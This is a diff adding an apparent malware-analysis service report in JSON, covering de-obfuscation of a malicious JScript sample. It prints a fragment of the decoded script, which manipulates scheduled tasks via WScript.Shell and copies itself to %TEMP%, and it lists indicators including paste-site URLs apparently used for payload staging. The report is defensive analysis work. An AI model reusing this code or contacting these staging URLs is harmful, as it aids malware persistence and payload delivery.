@@ -1,0 +1,204 @@
+{
+  "extra": {
+    "drop_file": false,
+    "score": 130,
+    "sections": [
+      {
+        "auto_collapse": false,
+        "body": "Powershell vars, 1 time(s).\ncodec.uft-16, 1 time(s).\nconcatenation, 1 time(s).",
+        "body_config": {},
+        "body_format": "TEXT",
+        "classification": "TLP:C",
+        "depth": 0,
+        "heuristic": {
+          "attack_ids": [],
+          "frequency": 1,
+          "heur_id": 1,
+          "score": 30,
+          "score_map": {},
+          "signatures": {
+            "Powershell vars": 1,
+            "codec.uft-16": 1,
+            "concatenation": 1
+          }
+        },
+        "promote_to": null,
+        "tags": {},
+        "title_text": "De-obfuscation steps taken by DeobsfuScripter",
+        "zeroize_on_tag_safe": false
+      },
+      {
+        "auto_collapse": false,
+        "body": "\\xff\\xfefunction jfureufujghs() {\nvar objShell = new ActiveXObject(\"WScript.Shell\");\n\nvar strTaskName = \"task name\";\n\nvar strDeleteCommand = \"schtasks /delete /tn \" + strTaskName + \" /f\";\nobjShell.Run(strDeleteCommand, 0, true);\n\nvar strScriptPath = WScript.ScriptFullName;\n\nvar strTempFolder = objShell.ExpandEnvironmentStrings(\"%TEMP%\");\n\nvar strTargetFile = strTempFolder + \"\\\\temp name.js\";\n\n// Cria um objeto FileSystemObject\nvar objFSO = new ActiveXObject(\"Scripting.FileSystemObject\");\n\ntry {\n    //",
+        "body_config": {},
+        "body_format": "MEMORY_DUMP",
+        "classification": "TLP:C",
+        "depth": 0,
+        "heuristic": null,
+        "promote_to": null,
+        "tags": {},
+        "title_text": "First 500 bytes of the final layer:",
+        "zeroize_on_tag_safe": false
+      },
+      {
+        "auto_collapse": false,
+        "body": "New IOCs found in pass 1:\nFound FILE STRING BLACKLISTED: Scripting.FileSystemObject\nFound FILE STRING BLACKLISTED: WScript.Shell\nFound NETWORK STATIC DOMAIN: jXALS.open\nFound NETWORK STATIC DOMAIN: objShell.Run\nFound NETWORK STATIC DOMAIN: schemas.microsoft.com\nFound NETWORK STATIC DOMAIN: textbin.net\nFound NETWORK STATIC DOMAIN: www.w3.org\nFound FILE STRING API: CopyFile\nFound FILE STRING API: ShellExecute\nFound NETWORK STATIC URI: http://schemas.microsoft.com/windows/2003/08/printing/printschemaframework\nFound NETWORK STATIC URI: http://www.w3.org/2001/XMLSchema\nFound NETWORK STATIC URI: https://textbin.net/raw/ezjmofz3s6\nNew IOCs found reversed in the final layer:\nFound NETWORK STATIC URI: https://paste.ee/d/JDCTl/0\nFound NETWORK STATIC DOMAIN: paste.ee",
+        "body_config": {},
+        "body_format": "MEMORY_DUMP",
+        "classification": "TLP:C",
+        "depth": 0,
+        "heuristic": {
+          "attack_ids": [],
+          "frequency": 1,
+          "heur_id": 7,
+          "score": 100,
+          "score_map": {},
+          "signatures": {}
+        },
+        "promote_to": null,
+        "tags": {
+          "file": {
+            "string": {
+              "api": [
+                "CopyFile",
+                "ShellExecute"
+              ],
+              "blacklisted": [
+                "Scripting.FileSystemObject",
+                "WScript.Shell"
+              ]
+            }
+          },
+          "network": {
+            "static": {
+              "domain": [
+                "jXALS.open",
+                "objShell.Run",
+                "schemas.microsoft.com",
+                "textbin.net",
+                "www.w3.org",
+                "paste.ee"
+              ],
+              "uri": [
+                "http://schemas.microsoft.com/windows/2003/08/printing/printschemaframework",
+                "http://www.w3.org/2001/XMLSchema",
+                "https://textbin.net/raw/ezjmofz3s6",
+                "https://paste.ee/d/JDCTl/0"
+              ]
+            }
+          }
+        },
+        "title_text": "New IOCs found after de-obfustcation",
+        "zeroize_on_tag_safe": false
+      }
+    ]
+  },
+  "files": {
+    "extracted": [],
+    "supplementary": [
+      {
+        "name": "af5affdc568a839cf3fdfbd57879bd9a59b2fe3f97ede0f8674637abe6f6d73d_decoded_final",
+        "sha256": "9fa563b2e5dbe89d39fb2953a8d2b6adf3d85a67261dd0e091990cf28c22e6cd"
+      }
+    ]
+  },
+  "results": {
+    "heuristics": [
+      {
+        "attack_ids": [],
+        "heur_id": 1,
+        "signatures": [
+          "Powershell vars",
+          "codec.uft-16",
+          "concatenation"
+        ]
+      },
+      {
+        "attack_ids": [],
+        "heur_id": 7,
+        "signatures": []
+      }
+    ],
+    "tags": {
+      "file.string.api": [
+        {
+          "heur_id": 7,
+          "signatures": [],
+          "value": "CopyFile"
+        },
+        {
+          "heur_id": 7,
+          "signatures": [],
+          "value": "ShellExecute"
+        }
+      ],
+      "file.string.blacklisted": [
+        {
+          "heur_id": 7,
+          "signatures": [],
+          "value": "Scripting.FileSystemObject"
+        },
+        {
+          "heur_id": 7,
+          "signatures": [],
+          "value": "WScript.Shell"
+        }
+      ],
+      "network.static.domain": [
+        {
+          "heur_id": 7,
+          "signatures": [],
+          "value": "jXALS.open"
+        },
+        {
+          "heur_id": 7,
+          "signatures": [],
+          "value": "objShell.Run"
+        },
+        {
+          "heur_id": 7,
+          "signatures": [],
+          "value": "paste.ee"
+        },
+        {
+          "heur_id": 7,
+          "signatures": [],
+          "value": "schemas.microsoft.com"
+        },
+        {
+          "heur_id": 7,
+          "signatures": [],
+          "value": "textbin.net"
+        },
+        {
+          "heur_id": 7,
+          "signatures": [],
+          "value": "www.w3.org"
+        }
+      ],
+      "network.static.uri": [
+        {
+          "heur_id": 7,
+          "signatures": [],
+          "value": "http://schemas.microsoft.com/windows/2003/08/printing/printschemaframework"
+        },
+        {
+          "heur_id": 7,
+          "signatures": [],
+          "value": "http://www.w3.org/2001/XMLSchema"
+        },
+        {
+          "heur_id": 7,
+          "signatures": [],
+          "value": "https://paste.ee/d/JDCTl/0"
+        },
+        {
+          "heur_id": 7,
+          "signatures": [],
+          "value": "https://textbin.net/raw/ezjmofz3s6"
+        }
+      ]
+    },
+    "temp_submission_data": {}
+  }
+}
